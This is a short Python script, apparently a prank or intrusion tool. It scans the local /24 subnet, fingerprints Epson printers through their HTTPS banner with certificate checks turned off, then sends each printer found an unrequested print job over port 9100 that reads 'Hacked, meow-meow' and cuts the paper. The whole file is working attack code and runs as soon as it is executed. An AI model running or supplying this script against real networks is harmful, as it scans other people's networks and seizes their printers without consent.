import ssl
import socket
import fcntl
import struct
from concurrent.futures import ProcessPoolExecutor
from escpos.printer import Network
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

### for terminal colors
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'

### tcp scan 443 port
def check_ip(addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        res = s.connect((addr, 443))
        s = ssl.wrap_socket(s, keyfile = None, 
                            certfile = None, 
                            server_side = False, 
                            cert_reqs = ssl.CERT_NONE, 
                            ssl_version = ssl.PROTOCOL_SSLv23)
        s.sendall(b"GET / HTTP/1.1\r\nHost: " + addr.encode() + b"\r\nConnection: close\r\n\r\n")
        banner = s.recv(4096).decode()
        if "EPSON_Linux UPnP/1.0" in banner:
            print (Colors.YELLOW + banner + Colors.ENDC)
            print (Colors.GREEN + f"found epson printer: {addr} " + Colors.ENDC)
            return True
    except:
        return False

### print via 9100 port
def hack(host):
    print (Colors.YELLOW + "try to hack printer... " + str(host) + Colors.ENDC)
    printer = Network(host) #Printer IP Address
    printer.text("Hacked, meow-meow =^..^=\n")
    printer.cut()
    print (Colors.GREEN + "printer successfully hacked :)" + Colors.ENDC)

### get my wlan IP address
def my_ip(iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    iface = struct.pack('256s', iface.encode('utf_8'))
    addr = fcntl.ioctl(s.fileno(), 0x8915, iface)[20:24]
    return socket.inet_ntoa(addr)

### scan subnet for epson printers
def scan_net():
    hosts = []
    subnet = str(my_ip("wlan0"))
    print (Colors.BLUE + "subnet: " + subnet + "/24..." + Colors.ENDC)
    subnet = ".".join(subnet.split(".")[:-1])

    for i in range(0, 255):
        ip = subnet + "." + str(i)
        hosts.append(ip)

    with ProcessPoolExecutor(len(hosts)) as executor:
        results = executor.map(check_ip, hosts)
        for host, is_printer in zip(hosts, results):
            if is_printer:
                hack(host)
scan_net()